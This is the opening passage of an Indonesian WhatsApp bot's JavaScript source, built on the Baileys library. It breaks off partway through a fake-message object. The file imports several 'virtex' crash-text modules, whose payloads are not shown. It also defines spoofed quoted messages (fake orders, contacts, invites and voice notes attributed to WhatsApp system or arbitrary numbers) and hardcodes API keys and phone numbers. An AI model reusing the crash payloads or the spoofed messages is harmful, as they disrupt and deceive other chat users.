// 𝘾𝙧𝙚𝙖𝙩𝙚𝙙 𝘽𝙮 Akmal
// 𝙈𝙖𝙠𝙖𝙨𝙞𝙝 𝙇𝙤𝙧𝙙 ☻︎
const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  MessageOptions,
  Mimetype,
  MimetypeMap,
  WALocationMessage,
  ChatModification,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  ReclientectMode,
  ProxyAgent,
  GroupSettingChange,
  waChatKey,
  mentionedJid,
  processTime,
} = require("@adiwajshing/baileys");
const simple = require("./lib/simple.js");
const { virtex, vipi } = require("./lib/virtex.js"); 
const { Toxic } = require('./lib/Toxic.js')
const hx = require("hxz-api");
const qrcode = require("qrcode-terminal");
const moment = require("moment-timezone");
const speed = require("performance-now");
const request = require("request");
const { spawn, exec, execSync } = require("child_process");
const fs = require("fs");
const axios = require("axios");
const ffmpeg = require("fluent-ffmpeg");
const { EmojiAPI } = require("emoji-api");
const ig = require("insta-fetcher");
const emoji = new EmojiAPI();
const fetch = require("node-fetch");
const FormData = require("form-data");
const phoneNum = require("awesome-phonenumber");
const gis = require("g-i-s");
const got = require("got");
const imageToBase64 = require("image-to-base64");
const ID3Writer = require("browser-id3-writer");
const crypto = require('crypto')
const brainly = require("brainly-scraper");
const yts = require("yt-search");
const ms = require("parse-ms");
const os = require('os');
const toMs = require("ms");
const { error } = require("qrcode-terminal");
const {
  getBuffer,
  h2k,
  generateMessageID,
  getGroupAdmins,
  getRandom,
  banner,
  start,
  info,
  success,
  close,
} = require("./lib/functions");
const { color, bgcolor } = require("./lib/color");
const { virtex90 } = require('./virtex/virtex90')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
const { fetchJson, getBase64, kyun, createExif } = require("./lib/fetcher");
const { yta, ytv, igdl, upload, formatDate } = require("./lib/ytdl");
const { webp2mp4File } = require("./lib/webp2mp4");
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const afk = JSON.parse(fs.readFileSync("./lib/off.json"));
const { sleep, isAfk, cekafk, addafk } = require("./lib/offline");
const { cmdadd } = require("./lib/totalcmd.js");
const voting = JSON.parse(fs.readFileSync("./lib/voting.json"));
const { uptotele, uploadFile, RESTfulAPI, uploadImages } = require('./lib/uploadimage');
const { addVote, delVote } = require("./lib/vote");
const reminder = require("./lib/reminder");
const { jadibot, stopjadibot, listjadibot } = require("./lib/jadibot");
const afkk = JSON.parse(fs.readFileSync('./database/afk.json'))
const tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
const banned = JSON.parse(fs.readFileSync('./database/banned.json'))
const _reminder = JSON.parse(fs.readFileSync("./database/reminder.json"));
let _registered = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let register = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let antihidetg = JSON.parse(fs.readFileSync("./database/antihidetag.json"))
const vien = JSON.parse(fs.readFileSync('./database/vien.json'))
const truth = JSON.parse(fs.readFileSync('./database/truth.json'))
const dare = JSON.parse(fs.readFileSync('./database/dare.json'))
const mute = JSON.parse(fs.readFileSync('./database/mute.json'))
// BATAS IMAGE FOLDER //
const iye = fs.readFileSync('./stik/thumb.jpeg')
const asw1 = 'https://f.top4top.io/p_2073p4mwa0.jpg'
const sip = fs.readFileSync('./stik/oksip.jpeg')
const bgg = fs.readFileSync('./stik/fake.jpeg')
//// Image ///
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Selamat malam";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Selamat senja🌞";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Selamat sore🌄";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Selamat siang☀️";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Selamat pagi🌅";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Selamat malam🌃";
    }
 // BATAS \\
menusimpel = true
banChats = false;
offline = false;
antidel = true;
welcom = true;
antical = true
readGc = true; 
readPc = false;
autovn = true;
multi = false
harga = 0
matauang = 'USD'
nopref = true
numbernye = '0'
autoketik = true;
prefixStatus = true;
targetpc = "6289505478069"
owner = "6289505478069"
fakeyoi = "Lord BotZ"; 
HunterApi = "Ikyy69", 
xchillds = 'XChillDs' 
hardi = 'hardianto', 
valkey = "rivalgans", 
zeksapi = "vallganz5",
dapapi = "anakasu",
nomorowner1 = "@6289505478069"; 
fake = `𝗢𝘄𝗻𝗲𝗿 : ${fakeyoi}\n🍃︎ 𝗣𝗿𝗲𝗳𝗶𝘅 :「 ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」`;
thumb = fs.readFileSync("./stik/thumb.jpeg"); 
numbernye = "0"; 
waktu = "-";
alasan = "-"; 
autojoin = true;
cmhit = []
hit_today = [];
//=================================================//
let _scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));

// 𝗙𝘂𝗻𝗰𝗮𝘁𝗶𝗼𝗻 𝗦𝘁𝗶𝗰𝗸𝗲𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 シ︎
const addCmd = (id, command) => {
  const obj = { id: id, chats: command };
  _scommand.push(obj);
  fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
};
const getCommandPosition = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return position;
  }
};

const getCmd = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return _scommand[position].chats;
  }
};

const checkSCommand = (id) => {
  let status = false;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      status = true;
    }
  });
  return status;
};
function monospace(string) {
return '```' + string + '```'
}   
const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
module.exports = KonX = async (KonX, mek) => {
  try {
    if (!mek.hasNewMessage) return;
    mek = mek.messages.all()[0];
    if (!mek.message) return;
    if (mek.key && mek.key.remoteJid == "status@broadcast") return;
    global.blocked;
    mek.message =
      Object.keys(mek.message)[0] === "ephemeralMessage"
        ? mek.message.ephemeralMessage.message
        : mek.message;
const typei = Object.keys(mek.message)[0]
const type = Object.keys(mek.message)[0]
let _chats =
      type === "conversation" && mek.message.conversation
        ? mek.message.conversation
        : type == "imageMessage" && mek.message.imageMessage.caption
        ? mek.message.imageMessage.caption
        : type == "videoMessage" && mek.message.videoMessage.caption
        ? mek.message.videoMessage.caption
        : type == "extendedTextMessage" && mek.message.extendedTextMessage.text
        ? mek.message.extendedTextMessage.text
        : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId
        ? mek.message[type].selectedButtonId
        : type == "stickerMessage" &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== null &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined
        ? getCmd(mek.message[type].fileSha256.toString("base64"))
        : "";
const isImage = (type === 'imageMessage')
const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
if (multi){
		    var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
            if (nopref){
                prefix = ''
            } else {
                prefix = prefa
            }
        }
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const {
      text,
      extendedText,
      contact,
      location,
      contactsArray,
      liveLocation,
      image,
      video,
      sticker,
      document,
      audio,
      product,
    } = MessageType;
const body = (type === 'listResponseMessage' && mek.message.listResponseMessage.title) ? mek.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budo = (typei === 'conversation') ? mek.message.conversation : (typei === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
    const q = args.join(" ");
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
    const botNumber = KonX.user.jid;
    
    const botNumberss = KonX.user.jid + "@c.us";
    const isGroup = from.endsWith("@g.us");

    const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"));
    const antivirtex = JSON.parse(
      fs.readFileSync("./database/antivirtex.json")
    );
    
    const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
    const nsfww = JSON.parse(fs.readFileSync('./database/nsfww.json'))
    const bancht = JSON.parse(fs.readFileSync('./database/banchat.json'));
    const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
    const antihidetg = JSON.parse(
      fs.readFileSync("./database/antihidetag.json")
    );
    const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
    const isAntiviewonce = isGroup ? antivo.includes(from) : false;
    const isKickarea = isGroup ? kickarea.includes(from) : false;
    const isNsfw = isGroup ? nsfww.includes(from) : false
    const isAntivirtex = isGroup ? antivirtex.includes(from) : false;
    const isAntilink = isGroup ? antilink.includes(from) : false;
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙂𝙘
var ampun = await KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
ampun.map( async ({ jid }) => {
if (readGc === false) return
await KonX.chatRead(jid)
})
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙋𝙘
var chatss = await KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readPc === false) return
await KonX.chatRead(jid)
})
// 𝘼𝙪𝙩𝙤 𝙑𝙣:𝙫
if (autovn) {
	if (autovn === false) return
await KonX.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await KonX.updatePresence(from, Presence.composing)
}
const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
    const sender = mek.key.fromMe
      ? KonX.user.jid
      : isGroup
      ? mek.participant
      : mek.key.remoteJid;
    let senderr = mek.key.fromMe
      ? KonX.user.jid
      : mek.key.remoteJid.endsWith("@g.us")
      ? mek.participant
      : mek.key.remoteJid;
    const totalchat = await KonX.chats.all();
    const ownerNumber = [`6289505478069@s.whatsapp.net`]
	const senderNumber = sender.split("@")[0] 
    const m = simple.smsg(KonX, mek);
    const groupMetadata = isGroup ? await KonX.groupMetadata(from) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const groupId = isGroup ? groupMetadata.jid : "";
    const itsMe = mek.key.fromMe ? true : false
    const isRegistered = checkRegisteredUser(sender)
   const isRegister = register.includes(sender)
    const groupMembers = isGroup ? groupMetadata.participants : "";
    const groupDesc = isGroup ? groupMetadata.desc : "";
    const isOwner = ownerNumber.includes(sender)
    const groupOwner = isGroup ? groupMetadata.owner : "";
    const hour_now = moment().format('HH:mm:ss')
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : "";
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
    const isGroupAdmins = groupAdmins.includes(sender) || false;
    const isBanchat = isGroup ? bancht.includes(from) : false
    const isVote = isGroup ? voting.includes(from) : false;
    const conts = mek.key.fromMe
      ? KonX.user.jid
      : KonX.contacts[sender] || { notify: jid.replace(/@.+/, "") };
    const pushname = mek.key.fromMe
      ? KonX.user.name
      : conts.notify || conts.vname || conts.name || "-";
    const readmore = "͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏";
    if (prefix && command) cmdadd();
    const totalhit = JSON.parse(fs.readFileSync("./lib/totalcmd.json"))[0]
      .totalcmd;
const daftar1 = `Hai kak  ${pushname} ${ucapanWaktu} \n\nSebelum Menggunakan Bot Verify Terlebih Dahulu Ya `
       const daftar2 = '```Ketik Tombol Di Bawah Untuk Verify Kak Atau Ketik 8473\nDaftar dlu bwanh︎🗿☕```'
       const daftar3 = [
          {
            buttonId: `verify`,
            buttonText: {
              displayText: `DAFTAR 🗿☕`,
            },
            type: 1,
          },]
var hayuk0 = '[NOT VERIFIED]'
			if (isRegistered) {
			hayuk0 = '[√ VERIFIED]'
			}
    //Y
const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
    const time = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
    const jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const wita = moment.tz("Asia/Makassar").format("HH:mm:ss");
    const wit = moment.tz("Asia/Jayapura").format("HH:mm:ss");
    let locale = "id";
    let d = new Date();
    let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    let date = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let waktu = d.toLocaleDateString(locale, {
      hour: "numeric",
      minute: "numeric",
      second: "numeric",
    });
cmhit.push(command)
    //MESS
    mess = {
      wait: "*Tunggu Permintaan Anda Sedang Di Proses*︎",
      success: "*Succes*︎",
      wrongFormat: "Format salah, coba liat lagi di menu",
      error: {
        stick: "bukan sticker itu:v",
        apiz: "Nulisnya Jan Kepanjangan Erorkan",
        Iv: "Linknya error:v",
      },
      only: {
        group: "Khusus grup ngab",
      },
    };

    const isUrl = (url) => {
      return url.match(
        new RegExp(
          /https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,
          "gi"
        )
      );
    };
  /*const reply = (teks) => {
      KonX.sendMessage(from, teks, text, { quoted: mek });
    };*/
    const textImg = (teks) => {
           return ikyy.sendMessage(from, teks, text, {quoted: freply, thumbnail: fs.readFileSync('./KonX.jpg')})
        }
const math = (teks) => {
           return Math.floor(teks)
       }
/*const reply = (teks) => {
			KonX.sendMessage(from, teks, text, { thumbnail: iye, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jam} - ${week} ${weton} - ${date}`,body:"",previewType:"PHOTO",thumbnail:iye,sourceUrl:`https://wa.me/62858157008612?text=Assalamualaikum`}}})
		}*/
    const sendMess = (hehe, teks) => {
      KonX.sendMessage(hehe, teks, text);
    };

    const mentions = (teks, memberr, id) => {
      id == null || id == undefined || id == false
        ? KonX.sendMessage(from, teks.trim(), extendedText, {
            contextInfo: { mentionedJid: memberr },
          })
        : KonX.sendMessage(from, teks.trim(), extendedText, {
            quoted: mek,
            contextInfo: { mentionedJid: memberr },
          });
    };
// Fake Reply Bang:)
    const ftroli = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "6289523258649-1604595598@g.us",
      },
      message: {
        orderMessage: {
          itemCount: 10,
          status: 200,
          thumbnail: iye,
          surface: 200,
          message: iye,
          orderTitle: "ItsMeVall.",
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./KonX.jpg')
        }}}
const freply7 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '1595603042@s.whatsapp.net' } : {}) }, message: { "productMessage":{"product": {"productImage": {"mimetype":'image/jpeg',"jpegThumbnail": iye, "title": `${ucapanWaktu} ${pushname}`, "productImageCount": 1 }, "businessOwnerJid": `0@s.whatsapp.net` }}}
}
 const fkontak = { 
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKE STICKER
            const fsticker = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
            //FAKE VN
const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 99999,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: iye, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const ftroli2 = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 99999,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: fake, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": `${ucapanWaktu} ${pushname}`,
			"groupName": `${ucapanWaktu} ${pushname}`, 
            "caption": `${ucapanWaktu} ${pushname}`, 
            'jpegThumbnail': fake
		}
	}
}
    const fdoc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { documentMessage: { title: fake, jpegThumbnail: thumb } },
    };
    const fvn = {
      key: {
        participant: `16505434800@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 999999,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          gifPlayback: "true",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
const fstick = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "6289643739077-1613049930@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf",
		"pngThumbnail": iye,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "0418",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
    "status": "PENDING"
  }
// STICKER

    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: "P",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `628551000185@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${ucapanWaktu} ${pushname}`,
                 "h": `${ucapanWaktu} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${ucapanWaktu} ${pushname}`,
